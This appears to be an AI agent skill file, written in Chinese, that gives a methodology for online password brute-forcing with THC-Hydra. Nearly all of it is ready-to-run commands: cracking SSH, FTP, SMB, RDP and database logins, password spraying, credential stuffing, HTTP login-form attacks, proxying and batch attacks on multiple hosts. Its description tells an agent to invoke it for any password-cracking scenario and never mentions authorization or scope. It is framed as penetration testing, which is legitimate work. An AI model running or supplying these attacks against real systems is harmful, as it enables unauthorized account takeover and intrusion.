---
name: hydra-brute
description: "使用 Hydra 进行在线密码暴力破解。当需要对 SSH/FTP/HTTP/SMB/RDP/MySQL/MSSQL 等服务进行密码爆破、密码喷洒、凭据填充时使用。Hydra 是最经典的在线暴力破解工具，支持 50+ 协议。任何涉及在线密码爆破、登录破解、协议暴力测试的场景都应使用此技能"
metadata:
  tags: "hydra,brute,password,暴力破解,密码爆破,SSH,FTP,HTTP,SMB,RDP,MySQL,密码喷洒,凭据填充"
  category: "tool"
---

# Hydra 在线密码暴力破解方法论

Hydra (THC-Hydra) 是最经典的在线暴力破解工具。核心优势：**协议覆盖广**（50+ 协议）+ **灵活配置**（支持用户/密码列表、单用户多密码、多用户单密码）+ **速度快**（多线程并发）。

项目地址：https://github.com/vanhauser-thc/thc-hydra

## Phase 1: 基本爆破

```bash
# SSH 爆破
hydra -l admin -P passwords.txt ssh://target.com

# FTP 爆破
hydra -l root -P passwords.txt ftp://target.com

# SMB 爆破
hydra -l administrator -P passwords.txt smb://target.com

# RDP 爆破
hydra -l administrator -P passwords.txt rdp://target.com

# MySQL 爆破
hydra -l root -P passwords.txt mysql://target.com
```

## Phase 2: 用户名和密码组合

```bash
# 单用户 + 密码列表
hydra -l admin -P top100.txt ssh://target

# 用户列表 + 单密码（密码喷洒）
hydra -L users.txt -p "P@ssw0rd" ssh://target

# 用户列表 + 密码列表
hydra -L users.txt -P passwords.txt ssh://target

# 用户名=密码 测试
hydra -L users.txt -e nsr ssh://target
# n=空密码, s=用户名作密码, r=反转用户名

# 凭据文件（user:pass 格式）
hydra -C creds.txt ssh://target
```

## Phase 3: HTTP 表单爆破

```bash
# POST 表单爆破
hydra -l admin -P passwords.txt target http-post-form \
  "/login:username=^USER^&password=^PASS^:F=incorrect"

# GET 表单爆破
hydra -l admin -P passwords.txt target http-get-form \
  "/login?user=^USER^&pass=^PASS^:F=fail"

# HTTPS 表单
hydra -l admin -P passwords.txt target https-post-form \
  "/login:user=^USER^&pass=^PASS^:F=error"

# 带 Cookie
hydra -l admin -P passwords.txt target http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=fail:H=Cookie: session=abc"
```

## Phase 4: 高级选项

```bash
# 指定端口
hydra -l admin -P passwords.txt -s 2222 ssh://target

# 控制线程数（默认 16）
hydra -l admin -P passwords.txt -t 4 ssh://target

# 控制等待时间
hydra -l admin -P passwords.txt -w 5 ssh://target

# 输出到文件
hydra -l admin -P passwords.txt -o results.txt ssh://target

# 恢复中断的攻击
hydra -R

# 详细输出
hydra -l admin -P passwords.txt -V ssh://target

# 使用代理（HTTP 模块用 HYDRA_PROXY_HTTP；SSH 等非 HTTP 模块用 HYDRA_PROXY）
HYDRA_PROXY=socks5://127.0.0.1:1080 hydra -l admin -P passwords.txt ssh://target
```

## 渗透测试常用组合

| 场景 | 命令 |
|------|------|
| SSH 快速测试 | `hydra -l root -P top100.txt -t 4 ssh://target` |
| 密码喷洒 | `hydra -L users.txt -p "Company2024!" ssh://target` |
| Web 登录爆破 | `hydra -l admin -P pass.txt target http-post-form "/login:u=^USER^&p=^PASS^:F=fail"` |
| 数据库爆破 | `hydra -l sa -P pass.txt mssql://target` |
| 批量 SSH | `hydra -L users.txt -P pass.txt -M targets.txt ssh` |
